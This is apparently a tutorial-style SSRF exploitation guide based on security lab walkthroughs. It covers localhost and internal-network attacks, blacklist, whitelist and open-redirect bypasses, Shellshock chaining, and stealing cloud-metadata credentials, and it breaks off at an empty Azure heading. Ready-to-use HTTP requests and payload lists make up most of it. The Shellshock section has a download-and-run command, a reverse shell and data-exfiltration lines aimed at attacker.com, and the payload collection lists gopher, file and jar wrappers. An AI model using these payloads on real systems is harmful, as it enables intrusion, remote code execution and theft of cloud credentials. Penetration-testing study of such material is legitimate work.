# 🌐 SSRF (Server-Side Request Forgery) - Complete Guide

## 📋 Table of Contents

1. What is SSRF
2. Basic SSRF Attacks
3. Blind SSRF Techniques
4. Filter Bypass Methods
5. Advanced SSRF Exploitation
6. Cloud Metadata Attacks
7. Famous SSRF Payloads
8. Mitigation Strategies

---

## ⚠️ Educational Notice

**Purpose:** This guide is for authorized security testing, bug bounty programs, and educational purposes only. Always obtain proper authorization before testing any system.

---

## 🎯 What is SSRF?

**Server-Side Request Forgery (SSRF)** is a web security vulnerability that allows an attacker to cause the server-side application to make HTTP requests to an unintended location.

### 🍽️ Real-World Analogy

**Restaurant Scenario:**

```
🏪 Restaurant = Web Application
👨‍🍳 Waiter = Backend Server
📋 Order = HTTP Request
🔐 Special Ingredients = Sensitive Internal Resources

Normal: "Bring me item #5 from menu"
Attack: "Bring me the secret recipe from the kitchen!"
```

### 💥 Impact of SSRF

**Severity:** 🔴 Critical

**What Attackers Can Do:**

```
✓ Access internal services (admin panels, databases)
✓ Read cloud metadata (AWS, Azure, GCP credentials)
✓ Scan internal network
✓ Execute remote code (via protocol smuggling)
✓ Bypass firewall/IP restrictions
✓ Access sensitive files
✓ Perform port scanning
✓ Launch attacks from trusted servers
```

### 🔍 Where SSRF Occurs

**Common Vulnerable Features:**

```
✓ Image/Document fetching from URLs
✓ Webhooks
✓ File imports from URLs
✓ PDF generators
✓ Link preview generation
✓ Proxy services
✓ API integrations
✓ Stock checking features
✓ URL scanners/validators
```

**Vulnerable Parameters:**

```
?url=
?uri=
?path=
?dest=
?redirect=
?link=
?api=
?callback=
?feed=
?host=
?page=
?reference=
?website=
```

---

## 1️⃣ Basic SSRF Against the Local Server

### 🎯 Vulnerability Description

The server doesn't validate that admin panels or internal services accessed via localhost are being requested by authorized users.

### 🔍 Step-by-Step Exploitation

#### Step 1: Find Vulnerable Parameter

**Look for URL parameters:**

```http
GET /product?url=http://external-site.com/image.jpg HTTP/1.1
Host: vulnerable-site.com
```

**Common patterns:**

```
Stock checker: /check?stockApi=http://stock.example.com
Image fetcher: /fetch?url=http://images.example.com
Webhook: /webhook?callback=http://callback.example.com
PDF generator: /pdf?source=http://document.example.com
```

#### Step 2: Identify API Endpoint

**Monitor the request:**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

#### Step 3: Target Localhost

**Basic Localhost Payloads:**

```
http://127.0.0.1/admin
http://localhost/admin
http://0.0.0.0/admin
http://[::1]/admin
http://127.1/admin
http://127.0.1/admin
http://0177.0.0.1/admin
http://2130706433/admin
```

**Modified Request:**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.0.0.1/admin
```

#### Step 4: Access Admin Functionality

**Response reveals admin panel:**

```html
<h1>Admin Panel</h1>
<a href="/admin/delete?username=carlos">Delete User</a>
<a href="/admin/promote?username=alice">Promote User</a>
```

#### Step 5: Perform Administrative Actions

**Delete user:**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.0.0.1/admin/delete?username=carlos
```

**💥 Success! User deleted via SSRF!**

### 🎯 Why This Works

**Trust Relationship:**

```
External Request → ❌ Blocked by firewall
Localhost Request → ✅ Trusted (bypasses authentication)

Firewall Rule:
"Block external access to /admin"
"Allow localhost access to /admin"

Exploitation:
External user → Server → Localhost/admin ✅
```

### 💡 Additional Localhost Variations

**Alternative Localhost Representations:**

```
# Standard
127.0.0.1
localhost

# IPv6
[::1]
[0:0:0:0:0:0:0:1]
[0:0:0:0:0:ffff:127.0.0.1]

# Alternative notations
127.1
127.0.1
0177.0.0.1 (Octal)
0x7f.0x0.0x0.0x1 (Hex)
2130706433 (Decimal)

# DNS tricks
localtest.me
127.0.0.1.nip.io
spoofed.burpcollaborator.net
```

---

## 2️⃣ Basic SSRF Against Another Back-End System

### 🎯 Vulnerability Description

Internal services on private IP ranges aren't directly accessible from the internet, but can be reached via SSRF through the vulnerable server.

### 🔍 Understanding Internal Networks

**Private IP Ranges (RFC 1918):**

```
10.0.0.0    - 10.255.255.255   (Class A)
172.16.0.0  - 172.31.255.255   (Class B)
192.168.0.0 - 192.168.255.255  (Class C)
```

**Common Internal Ports:**

```
:8080  - Alternative HTTP
:8888  - Alternative HTTP
:9090  - Monitoring/Admin
:3306  - MySQL
:5432  - PostgreSQL
:6379  - Redis
:27017 - MongoDB
:9200  - Elasticsearch
:5000  - Flask/Custom apps
```

### 🛠️ Step-by-Step Exploitation

#### Step 1: Find Parameterized Request

**Capture the request:**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock
```

**Send to Burp Repeater**

#### Step 2: Test Localhost First

**Verify SSRF exists:**

```http
stockApi=http://127.0.0.1:8080/admin
```

**If this works, proceed to scan internal network**

#### Step 3: Brute Force Internal IPs

**Setup Burp Intruder:**

```
1. Send request to Intruder
2. Set payload position on last octet
3. Payload type: Numbers
4. From: 1
5. To: 254
6. Step: 1
```

**Payload Position:**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.§1§:8080/admin
```

**Intruder will test:**

```
http://192.168.0.1:8080/admin
http://192.168.0.2:8080/admin
http://192.168.0.3:8080/admin
...
http://192.168.0.254:8080/admin
```

#### Step 4: Identify Valid Internal Host

**Look for different responses:**

```
192.168.0.1   → 500 Internal Server Error
192.168.0.2   → 500 Internal Server Error
...
192.168.0.68  → 200 OK + Admin content ✅
...
192.168.0.254 → 500 Internal Server Error
```

#### Step 5: Exploit Internal Service

**Access admin panel:**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.68:8080/admin
```

**Delete user:**

```http
stockApi=http://192.168.0.68:8080/admin/delete?username=carlos
```

**💥 Internal service exploited!**

### 🎯 Advanced Internal Network Scanning

**Scan Multiple Subnets:**

```bash
# Class C networks
192.168.0.0/24
192.168.1.0/24
192.168.2.0/24

# Class B networks
172.16.0.0/24
172.17.0.0/24
172.31.0.0/24

# Class A networks
10.0.0.0/24
10.0.1.0/24
```

**Port Scanning:**

```
http://192.168.0.68:80
http://192.168.0.68:443
http://192.168.0.68:8080
http://192.168.0.68:9090
http://192.168.0.68:3306
```

**Service Fingerprinting:**

```
Look for different response patterns:
- Response length
- Response time
- Error messages
- Server headers
- Content patterns
```

---

## 3️⃣ Blind SSRF with Out-of-Band Detection

### 🎯 Vulnerability Description

**Blind SSRF** occurs when the server makes the request but doesn't return the response to the attacker. Detection requires out-of-band techniques.

### 🔍 Understanding Blind SSRF

**Regular SSRF:**

```
Attacker → Server → Internal Service → Response → Attacker ✅
Can see response content
```

**Blind SSRF:**

```
Attacker → Server → Internal Service → Response → Server
Cannot see response content ❌
Need alternative detection method
```

### 🛠️ Step-by-Step Exploitation

#### Step 1: Setup Burp Collaborator

**In Burp Suite:**

```
1. Go to Burp menu → Burp Collaborator client
2. Click "Copy to clipboard"
3. You'll get a unique domain: abc123.burpcollaborator.net
```

**Alternative Out-of-Band Tools:**

```
✓ Burp Collaborator (Professional)
✓ interact.sh (Free)
✓ webhook.site (Free)
✓ requestbin.com (Free)
✓ pipedream.com (Free)
✓ Your own server with netcat


Use -> 
	sudo python3 -m http.server 80
	cloudflared tunnel --url http://localhost:80
       To create your known publicily accessable server.
```

#### Step 2: Identify Injection Point

**Common headers that trigger requests:**

```http
GET /product?id=1 HTTP/1.1
Host: vulnerable-site.com
Referer: http://abc123.burpcollaborator.net
User-Agent: Mozilla/5.0
X-Forwarded-For: abc123.burpcollaborator.net
X-Original-URL: http://abc123.burpcollaborator.net
X-Rewrite-URL: http://abc123.burpcollaborator.net
```

#### Step 3: Inject Collaborator Domain

**Test in Referer header:**

```http
GET /analytics HTTP/1.1
Host: vulnerable-site.com
Referer: http://abc123.burpcollaborator.net
```

**Why Referer?**

- Many analytics systems fetch referer URLs
- Used for tracking/logging
- Often processed server-side

#### Step 4: Poll Collaborator

**Check for interactions:**

```
1. Go back to Burp Collaborator client
2. Click "Poll now"
3. Look for DNS/HTTP interactions
```

**Successful Detection:**

```
✅ DNS lookup: abc123.burpcollaborator.net
✅ HTTP request: GET / HTTP/1.1
  Host: abc123.burpcollaborator.net
  User-Agent: Java/1.8.0_231
```

**💥 Blind SSRF confirmed!**

### 🎯 Exploitation Techniques

#### DNS Exfiltration

**Embed data in subdomain:**

```
http://EXFILTRATED-DATA.abc123.burpcollaborator.net
```

**Example:**

```
http://admin-password-is-secret123.abc123.burpcollaborator.net
```

#### Time-Based Detection

**If no out-of-band channel:**

```
http://internal-service:8080/?sleep=10

Response time > 10 seconds = Service exists
```

#### Error-Based Detection

**Different errors for different states:**

```
Connection refused       = Host exists, port closed
Connection timeout       = Host doesn't exist / firewall
Connection successful    = Service exists and responding
```

---

## 4️⃣ SSRF with Blacklist-Based Input Filter

### 🎯 Vulnerability Description

Developers implement blacklists to block common SSRF payloads like `localhost`, `127.0.0.1`, and `admin`, but blacklists can often be bypassed.

### 🔍 Understanding Blacklist Bypasses

**Blacklist Example:**

```javascript
// Blocked strings
const blacklist = [
  'localhost',
  '127.0.0.1',
  '0.0.0.0',
  'admin',
  '192.168',
  '10.0.0'
];

// Simple check (flawed!)
if (blacklist.some(blocked => url.includes(blocked))) {
  return "Blocked!";
}
```

### 🛠️ Bypass Techniques

#### Method 1: Alternative IP Representations

**Decimal Encoding:**

```
127.0.0.1 = 2130706433

Calculation:
127 × 256³ + 0 × 256² + 0 × 256¹ + 1 × 256⁰
= 127 × 16777216 + 0 + 0 + 1
= 2130706433

Payload: http://2130706433/admin
```

**Octal Encoding:**

```
127.0.0.1 = 0177.0.0.1 or 017700000001

Payload: http://0177.0.0.1/admin
Payload: http://017700000001/admin
```

**Hexadecimal Encoding:**

```
127.0.0.1 = 0x7f.0x0.0x0.0x1 or 0x7f000001

Payload: http://0x7f.0x0.0x0.0x1/admin
Payload: http://0x7f000001/admin
```

**Mixed Encoding:**

```
http://0x7f.0.0.1/admin
http://127.1/admin
http://127.0.1/admin
```

#### Method 2: URL Encoding

**Single Encoding:**

```
admin = %61dmin

Payload: http://127.0.0.1/%61dmin
```

**Double Encoding:**

```
a = %61
Double encoded: %2561

Payload: http://127.0.0.1/%25%36%31dmin
```

**Why Double Encoding Works:**

```
1st decode: %2561 → %61
2nd decode: %61 → a
Final URL: /admin

Blacklist check happens after 1st decode: /%61dmin ✅
Actual access happens after 2nd decode: /admin
```

#### Method 3: Case Manipulation

**If blacklist is case-sensitive:**

```
http://127.0.0.1/Admin
http://127.0.0.1/ADMIN
http://127.0.0.1/AdMiN
```

#### Method 4: Dot Variations

**Alternative notations:**

```
127.0.0.1 → 127.1
127.0.0.1 → 127.0.1
127.0.0.1 → 127.00.00.01
```

#### Method 5: DNS Tricks

**Use domains that resolve to localhost:**

```
localtest.me          → 127.0.0.1
127.0.0.1.nip.io     → 127.0.0.1
localhost.localtest.me → 127.0.0.1
```

### 🎯 Complete Bypass Example

**Step 1: Basic Payload (Blocked)**

```http
POST /product/stock HTTP/1.1
Content-Type: application/x-www-form-urlencoded

stockApi=http://127.0.0.1/admin

Response: "Blocked: localhost access not allowed"
```

**Step 2: Try Alternative IP (Still Blocked)**

```http
stockApi=http://127.0.0.1/%61dmin

Response: "Blocked: admin path not allowed"
```

**Step 3: Double Encode 'admin' (Success!)**

```http
stockApi=http://127.1/%25%36%31dmin

Response: Admin panel content ✅
```

**Breakdown:**

```
127.1           → Resolves to 127.0.0.1 ✅
%2561           → First decode: %61
%61             → Second decode: a
/%25%36%31dmin  → Eventually becomes /admin
```

### 📊 Bypass Payload Collection

**Localhost Representations:**

```
# Decimal
http://2130706433/

# Octal
http://017700000001/
http://0177.0.0.1/

# Hex
http://0x7f000001/
http://0x7f.0x0.0x0.0x1/

# Short forms
http://127.1/
http://127.0.1/

# IPv6
http://[::1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# DNS
http://localtest.me/
http://127.0.0.1.nip.io/
```

**Path Encoding:**

```
/admin
/%61dmin
/%61%64%6d%69%6e
/%2561%2564%256d%2569%256e (double)
/ADMIN
/Admin
/aDmIn
```

---

## 5️⃣ SSRF with Filter Bypass via Open Redirection

### 🎯 Vulnerability Description

When direct SSRF is blocked, an **open redirect** vulnerability on the same domain can be chained to bypass SSRF filters.

### 🔍 Understanding the Attack Chain

**Normal SSRF (Blocked):**

```
stockApi=http://192.168.0.12:8080/admin
❌ Blocked: External host not allowed
```

**Via Open Redirect (Success):**

```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
✅ Allowed: Same domain
✅ Redirects to internal service
```

### 🛠️ Step-by-Step Exploitation

#### Step 1: Identify Stock Check Feature

**Normal stock check:**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=/product/stock/check?productId=1&storeId=1
```

#### Step 2: Test Direct SSRF (Fails)

**Try internal network:**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.12:8080/admin

Response: "Invalid host: Only trusted domains allowed"
```

#### Step 3: Find Open Redirect

**Click "Next Product" button:**

```http
GET /product/nextProduct?currentProductId=1&path=/product/2 HTTP/1.1
Host: vulnerable-site.com

Response:
HTTP/1.1 302 Found
Location: /product/2
```

**Test with external URL:**

```http
GET /product/nextProduct?path=http://evil.com HTTP/1.1

Response:
HTTP/1.1 302 Found
Location: http://evil.com ← Open redirect!
```

#### Step 4: Chain Open Redirect with SSRF

**Craft malicious URL:**

```
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

**Use in stock API:**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

**What happens:**

```
1. Server checks stockApi parameter
2. Sees internal path: /product/nextProduct ✅
3. Makes request to /product/nextProduct?path=...
4. Open redirect triggers
5. Server follows redirect to http://192.168.0.12:8080/admin
6. Returns admin panel content!
```

#### Step 5: Access Admin Panel

**Response shows admin interface:**

```html
<h1>Admin Panel</h1>
<a href="/admin/delete?username=carlos">Delete User</a>
```

#### Step 6: Delete User

**Final payload:**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

**💥 User deleted via chained SSRF + Open Redirect!**

### 🎯 Why This Works

**Filter Bypass Logic:**

```
Whitelist Check:
"Is stockApi on trusted domain?" 
→ /product/nextProduct is on same domain ✅

Redirect Follows:
Server makes request → Gets 302 redirect → Follows to internal IP
Filter doesn't check redirect destination!
```

### 💡 Finding Open Redirects

**Common Parameters:**

```
?redirect=
?url=
?next=
?return=
?returnUrl=
?go=
?target=
?dest=
?destination=
?continue=
?rurl=
?redir=
```

**Common Locations:**

```
/logout?next=
/login?return=
/oauth/callback?redirect=
/language/switch?return=
/product/next?path=
```

---

## 6️⃣ Blind SSRF with Shellshock Exploitation

### 🎯 Vulnerability Description

Combining **Blind SSRF** with **Shellshock** (CVE-2014-6271) vulnerability allows remote code execution on internal systems.

### 🔍 Understanding Shellshock

**Shellshock Vulnerability:**

```bash
# Vulnerable bash versions < 4.3
# Function definition followed by command execution

() { :; }; /usr/bin/whoami

Explanation:
() { :; };     ← Empty function definition
/usr/bin/whoami ← Command executed after function
```

**Why It Works:**

- Bash improperly handles function definitions in environment variables
- HTTP headers become environment variables in CGI scripts
- Malicious function definition → command execution

### 🛠️ Step-by-Step Exploitation

#### Step 1: Install Collaborator Everywhere Extension

**In Burp Suite:**

```
1. Go to Extender → BApp Store
2. Search "Collaborator Everywhere"
3. Install extension
```

**What it does:**

- Automatically injects Collaborator payloads
- Tests all headers and parameters
- Detects out-of-band interactions

#### Step 2: Add Domain to Target Scope

**Configure scope:**

```
1. Target → Scope settings
2. Add lab domain: vulnerable-lab.net
3. Enable "Collaborator Everywhere" for this scope
```

#### Step 3: Browse the Site

**Load product pages:**

```
Visit: /product?productId=1
Visit: /product?productId=2
Visit: /product?productId=3
```

#### Step 4: Observe HTTP Interaction

**Collaborator Everywhere detects:**

```
HTTP Request to Burp Collaborator:
GET / HTTP/1.1
Host: abc123.burpcollaborator.net
Referer: http://vulnerable-lab.net/product?productId=1
User-Agent: Mozilla/5.0...
```

**✅ Referer header triggers external request!**

#### Step 5: Identify User-Agent in Request

**Observe Collaborator logs:**

```
The HTTP interaction contains:
User-Agent: Mozilla/5.0 (X11; Linux x86_64)...

This means User-Agent is processed and becomes environment variable!
```

#### Step 6: Generate Collaborator Payload

**Create unique subdomain:**

```
1. Burp → Collaborator client
2. Click "Copy to clipboard"
3. Your domain: xyz789.burpcollaborator.net
```

#### Step 7: Craft Shellshock Payload

**Payload structure:**

```bash
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

**Replace with your domain:**

```bash
() { :; }; /usr/bin/nslookup $(whoami).xyz789.burpcollaborator.net
```

**What this does:**

```
1. () { :; }; → Function definition (triggers Shellshock)
2. /usr/bin/nslookup → DNS lookup command
3. $(whoami) → Command substitution (gets username)
4. .xyz789.burpcollaborator.net → Your domain
5. Final: nslookup root.xyz789.burpcollaborator.net
```

#### Step 8: Send Request to Intruder

**Capture product page request:**

```http
GET /product?productId=1 HTTP/1.1
Host: vulnerable-lab.net
User-Agent: Mozilla/5.0...
Referer: http://stock.vulnerable-lab.net
```

**Send to Intruder**

#### Step 9: Replace User-Agent with Shellshock Payload

**Modified request:**

```http
GET /product?productId=1 HTTP/1.1
Host: vulnerable-lab.net
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).xyz789.burpcollaborator.net
Referer: http://stock.vulnerable-lab.net
```

#### Step 10: Configure Referer for IP Scanning

**Set payload position:**

```http
Referer: http://192.168.0.§1§:8080
```

**Intruder settings:**

```
Payload type: Numbers
From: 1
To: 255
Step: 1
```

#### Step 11: Start Attack

**Intruder will test:**

```
http://192.168.0.1:8080
http://192.168.0.2:8080
...
http://192.168.0.255:8080
```

**Each request with Shellshock payload in User-Agent**

#### Step 12: Poll Collaborator

**Check for DNS interactions:**

```
1. Go to Collaborator client
2. Click "Poll now"
3. Wait for interactions (asynchronous execution)
```

**Successful Exploit:**

```
✅ DNS Query Received:
peter-UyJNrF.xyz789.burpcollaborator.net

Subdomain: peter-UyJNrF
OS User: peter ← Username extracted!
```

**💥 Remote Code Execution via Blind SSRF + Shellshock!**

### 🎯 Why This Attack Works

**Attack Chain:**

```
1. SSRF via Referer header
   → Server makes HTTP request to internal IP

2. Internal server has CGI script
   → HTTP headers → Environment variables

3. Shellshock vulnerability
   → User-Agent environment variable → Bash execution

4. Command substitution
   → $(whoami) executes, gets username

5. DNS exfiltration
   → nslookup sends username to Collaborator

6. Out-of-band detection
   → Attacker receives DNS query with data
```

### 💡 Advanced Shellshock Payloads

**File Reading:**

```bash
() { :; }; /usr/bin/nslookup $(cat /etc/passwd | base64).xyz789.burpcollaborator.net
```

**Command Execution:**

```bash
() { :; }; /usr/bin/curl http://attacker.com/shell.sh | bash
```

**Reverse Shell:**

```bash
() { :; }; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Data Exfiltration:**

```bash
() { :; }; /usr/bin/wget --post-data="$(ls -la)" http://attacker.com
```

---

## 7️⃣ SSRF with Whitelist-Based Input Filter

### 🎯 Vulnerability Description

Applications implement whitelist filters that only allow specific domains, but URL parsing vulnerabilities can bypass these filters.

### 🔍 Understanding URL Parsing

**URL Components:**

```
http://username:password@host:port/path?query#fragment

Protocol: http://
Username: username
Password: password
Host: host
Port: port
Path: /path
Query: ?query
Fragment: #fragment
```

### 🛠️ Step-by-Step Exploitation

#### Step 1: Capture Stock Check Request

**Normal request:**

```http
POST /product/stock HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net/product/stock/check?productId=1
```

**Send to Repeater**

#### Step 2: Test Localhost (Blocked)

**Try basic SSRF:**

```http
stockApi=http://127.0.0.1/

Response: "Hostname validation failed: Only stock.weliketoshop.net allowed"
```

**✅ Whitelist filter detected!**

#### Step 3: Test Embedded Credentials

**URL with username:**

```http
stockApi=http://username@stock.weliketoshop.net/

Response: 200 OK ✅
```

**Why it works:**

```
URL Parser sees:
- Username: username
- Host: stock.weliketoshop.net ✅ (Whitelisted!)

Actual connection goes to: stock.weliketoshop.net
```

#### Step 4: Append Hash Symbol

**Add # after username:**

```http
stockApi=http://username#@stock.weliketoshop.net/

Response: "Invalid URL format"
```

**URL Interpretation:**

```
Protocol: http://
Host: username
Fragment: #@stock.weliketoshop.net/

Rejected because host is "username", not whitelisted
```

#### Step 5: Double-URL Encode the Hash

**Single encoding: # → %23** **Double encoding: # → %2523**

```http
stockApi=http://username%2523@stock.weliketoshop.net/

Response: 500 Internal Server Error 🎯
```

**What happened:**

```
1st Parse (Validation):
http://username%2523@stock.weliketoshop.net/
→ Host extracted: stock.weliketoshop.net ✅ (Whitelisted)

2nd Parse (Connection):
%2523 decoded to %23 (then to #)
→ http://username#@stock.weliketoshop.net/
→ Tries to connect to "username" (fails)
```

**✅ "Internal Server Error" = Server attempted connection to "username"!**

#### Step 6: Exploit with Localhost

**Replace username with localhost:**

```http
stockApi=http://localhost%2523@stock.weliketoshop.net/admin

Response: Admin panel content!
```

**URL Parsing Confusion:**

```
Validation Layer (Whitelist Check):
→ Sees: @stock.weliketoshop.net
→ Extracts host: stock.weliketoshop.net
→ Check passes ✅

Connection Layer (After decode):
→ Sees: localhost#@stock.weliketoshop.net
→ Connects to: localhost (everything after # is fragment/ignored)
→ Path: /admin
→ Success! 🎯
```

#### Step 7: Access Admin Functions

**View admin panel:**

```http
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
```

**Delete user:**

```http
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

**Why :80 is added:**

```
Some parsers treat :port as part of the host
localhost:80%2523 ensures proper parsing
After decode: localhost:80#@...
Connects to localhost on port 80
```

**💥 Whitelist bypassed! Admin access achieved!**

### 🎯 URL Parsing Vulnerabilities

**Common Parser Confusion:**

```
http://attacker.com@trusted.com
→ Some parsers: host = trusted.com ✅
→ Browser/curl: connects to attacker.com

http://trusted.com#@attacker.com
→ Validation: host = trusted.com ✅
→ After processing: connects to attacker.com

http://trusted.com%2523@attacker.com
→ First parse: host = attacker.com
→ After decode: host = trusted.com# → attacker.com
```

### 💡 Advanced Whitelist Bypasses

**Method 1: Subdomain Confusion**

```
http://localhost.trusted.com
http://trusted.com.attacker.com
http://trusted.com@attacker.com
```

**Method 2: URL Encoding**

```
http://trusted.com%2f@attacker.com
http://trusted.com%00.attacker.com
http://trusted.com%20@attacker.com
```

**Method 3: Protocol Confusion**

```
http://trusted.com\@attacker.com
http://trusted.com/@attacker.com
http://trusted.com?.attacker.com
```

**Method 4: Unicode/IDN**

```
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ@trusted.com
http://127。0。0。1@trusted.com
http://trusted.com@127․0․0․1
```

---

## 🌩️ Cloud Metadata SSRF Attacks

### 🎯 AWS Metadata Exploitation

**AWS Instance Metadata Service (IMDS):**

```
Endpoint: http://169.254.169.254
Purpose: Provides instance configuration and credentials
Access: Only from EC2 instances
```

#### IMDSv1 Exploitation (Legacy)

**Get IAM credentials:**

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/

Response: role-name

http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

Response:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrX...",
  "Token": "IQoJb3JpZ2lu...",
  "Expiration": "2024-11-24T..."
}
```

**Common Metadata Endpoints:**

```
# Instance information
/latest/meta-data/instance-id
/latest/meta-data/hostname
/latest/meta-data/local-ipv4
/latest/meta-data/public-ipv4

# IAM credentials
/latest/meta-data/iam/security-credentials/
/latest/meta-data/iam/security-credentials/[role-name]

# User data (often contains secrets)
/latest/user-data

# Instance identity
/latest/dynamic/instance-identity/document
```

#### IMDSv2 Bypass (Token Required)

**IMDSv2 requires token:**

```bash
# Step 1: Get token (requires PUT method)
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: TOKEN" \
  "http://169.254.169.254/latest/meta-data/"
```

**Bypass techniques:**

```
1. If SSRF allows POST/PUT → Can get token
2. If application forwards headers → Inject token header
3. Look for IMDSv1 still enabled (common misconfiguration)
```

### 🎯 Google Cloud Platform (GCP)

**GCP Metadata Service:**

```
Endpoint: http://metadata.google.internal
Alt: http://169.254.169.254

Required Header: Metadata-Flavor: Google
```

**Access tokens:**

```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Header: Metadata-Flavor: Google

Response:
{
  "access_token": "ya29.c.Kl6iB...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

**Common GCP metadata:**

```
# Project info
/computeMetadata/v1/project/project-id
/computeMetadata/v1/project/numeric-project-id

# Instance info
/computeMetadata/v1/instance/hostname
/computeMetadata/v1/instance/id
/computeMetadata/v1/instance/zone

# Service accounts
/computeMetadata/v1/instance/service-accounts/
/computeMetadata/v1/instance/service-accounts/default/token
/computeMetadata/v1/instance/service-accounts/default/email

# Attributes (often contain secrets)
/computeMetadata/v1/instance/attributes/
```

**Bypass header requirement:**

```
1. If SSRF forwards headers → Inject Metadata-Flavor
2. If allows custom headers → Add required header
3. CRLF injection to add header
```

### 🎯 Azure Metadata Service

**Azure Instance Metadata:**

```
Endpoint: http://169.254.169.254

Required:
- Header: Metadata: true
- Query: api-version=2021-02-01
```

**Access tokens:**

```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com
Header: Metadata: true

Response:
{
  "access_token": "eyJ0eXAi...",
  "expires_in": "3599",
  "expires_on": "1637782800",
  "resource": "https://management.azure.com"
}
```

**Common Azure metadata:**

```
# Instance info
/metadata/instance?api-version=2021-02-01
/metadata/instance/compute?api-version=2021-02-01
/metadata/instance/network?api-version=2021-02-01

# Identity tokens
/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com
/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://vault.azure.net
/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://storage.azure.com
```

### 🎯 DigitalOcean Metadata

**DigitalOcean Metadata:**

```
Endpoint: http://169.254.169.254

No special headers required!
```

**Access metadata:**

```
http://169.254.169.254/metadata/v1.json

Response:
{
  "droplet_id": 123456,
  "hostname": "example-droplet",
  "vendor_data": "#cloud-config...",
  "public_keys": ["ssh-rsa AAAA..."],
  "region": "nyc3",
  "interfaces": {...},
  "dns": {...}
}
```

---

## 🔥 Famous SSRF Payloads Collection

### 🎯 Localhost Variations

**Standard:**

```
http://127.0.0.1:80
http://localhost:80
http://0.0.0.0:80
http://[::1]:80
http://[::]:80
```

**Alternative Notations:**

```
# Decimal
http://2130706433/
http://3232235521/  (192.168.0.1)
http://3232235777/  (192.168.1.1)

# Octal
http://0177.0.0.1/
http://017700000001/
http://0177.0.0.01/

# Hexadecimal
http://0x7f.0x0.0x0.0x1/
http://0x7f000001/
http://0x7f.1/

# Mixed
http://127.0.1/
http://127.1/
http://127.0.0.0/
```

**IPv6:**

```
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:0:0:1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

**DNS Tricks:**

```
http://localtest.me/
http://customer1.app.localhost.my.company.127.0.0.1.nip.io/
http://mail.ebc.apple.com/  (resolves to 127.0.0.6)
http://127.0.0.1.xip.io/
http://www.127.0.0.1.xip.io/
http://mysite.127.0.0.1.xip.io/
http://foo@127.0.0.1:80@example.com/
```

### 🎯 Bypass Payloads

**URL Parser Confusion:**

```
http://127.0.0.1#@google.com/
http://127.0.0.1%00.google.com/
http://127.0.0.1%2523@google.com/
http://127.0.0.1\@google.com/
http://google.com#@127.0.0.1/
http://google.com%23@127.0.0.1/
http://google.com%2523@127.0.0.1/
```

**Enclosed Alphanumerics:**

```
http://ⓖⓞⓞⓖⓛⓔ.com  (enclosed alphanumerics)
http://127。0。0。1  (alternative dots)
http://127․0․0․1  (one dot leader)
```

**Protocol Wrappers (if supported):**

```
file:///etc/passwd
file:///c:/windows/win.ini
dict://127.0.0.1:11211/stats
sftp://evil.com:11111/
tftp://evil.com:12346/TESTUDPPACKET
ldap://127.0.0.1:389/%0astats%0aquit
gopher://127.0.0.1:8000/_GET / HTTP/1.0%0AHost: evil.com%0A%0A
jar:http://evil.com/evil.jar!/
```

### 🎯 Cloud Metadata Payloads

**AWS:**

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**GCP:**

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

**Azure:**

```
